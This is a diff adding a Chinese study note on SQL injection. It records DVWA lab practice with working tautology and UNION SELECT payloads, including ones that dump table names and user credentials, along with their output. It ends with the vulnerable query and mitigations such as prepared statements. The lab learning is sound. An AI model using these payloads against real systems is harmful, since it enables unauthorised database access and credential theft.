@@ -1,0 +1,69 @@
+SQL注入（SQL injection）
+一种WEB安全漏洞，指攻击者通过在用户输入框中插入恶意SQL代码，让后端数据库执行非预期的操作，从而窃取、篡改数据，甚至控制服务器。
+
+常见类型：                              防护方法：
+反射型                                     预编译语句
+基于错误注入                           输入过滤/转义
+盲注                                        最小权限原则
+联合注入查询                           使用ORM框架
+
+DVWA练习：
+判断型注入：1' OR '1'='1
+ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+
+ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+
+ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+
+ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+
+ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+
+联合查询测试:  1' UNION SELECT null, null -- 
+		       1' UNION SELECT version(), database() --
+ID: 1' UNION SELECT version(), database() -- 
+First name: 10.11.5-MariaDB-3
+Surname: dvwa
+			1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- 
+ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- 
+First name: admin
+Surname: admin
+
+ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- 
+First name: guestbook
+Surname: 
+
+ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- 
+First name: users
+Surname: 
+
+ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- 
+First name: access_log
+Surname: 
+
+ID: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- 
+First name: security_log
+Surname: 
+			1' UNION SELECT username,password FROM users --   ……
+
+用burpsuite验证
+
+1' UNION SELECT version(), database() --
+
+response 的raw中找到数据库版本名称
+验证成功
+
+为什么能注入：$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+low级未对用户输入做任何过滤
+如何改进：可以进行预编译，将用户的输入仅作为数据传递，杜绝SQL拼接，输入转义，过滤‘，“，\等特殊字符，在表单添加CRSF令牌，日志审计（记录异常请求，便于及时发现攻击行为），数据库权限最小化，输入强验证（强制id位正整数）
+			
